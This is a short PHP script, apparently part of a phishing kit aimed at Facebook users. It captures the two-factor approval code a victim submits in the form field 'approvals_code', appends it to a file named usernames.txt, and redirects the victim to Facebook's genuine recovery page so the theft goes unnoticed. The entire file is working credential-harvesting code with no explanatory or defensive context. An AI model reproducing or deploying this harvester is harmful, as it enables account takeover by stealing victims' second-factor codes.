<?php
file_put_contents("usernames.txt", "OTP: " . $_POST['approvals_code'] . "\n", FILE_APPEND);
header('Location: https://facebook.com/recover/initiate/');
exit();
?>
